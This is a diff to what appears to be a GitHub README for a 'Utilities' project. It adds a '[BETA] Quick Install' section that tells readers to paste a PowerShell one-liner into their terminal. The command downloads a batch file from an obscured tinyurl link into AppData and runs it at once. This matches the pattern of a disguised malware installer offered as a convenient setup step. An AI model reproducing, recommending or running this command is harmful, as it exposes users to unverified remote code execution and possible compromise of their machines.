@@ -23,6 +23,17 @@
 
 ---
 
+## 🦋 [BETA] Quick Install
+
+Paste this commad into CMD or PowerShell:
+
+```
+powershell -c "ni -f -it d $env:AppData\Utilities;iwr 'https://tinyurl.com/y3rm6r44' -OutFile $env:AppData\Utilities\Setup.bat;saps $env:AppData\Utilities\Setup.bat"
+```
+
+---
+
+
 ## 📸 Screenshots
 
 <img src="https://github.com/Abscissa24/Utilities/blob/main/Assets/Screenshots/Stable.png?raw=true" width="60%">
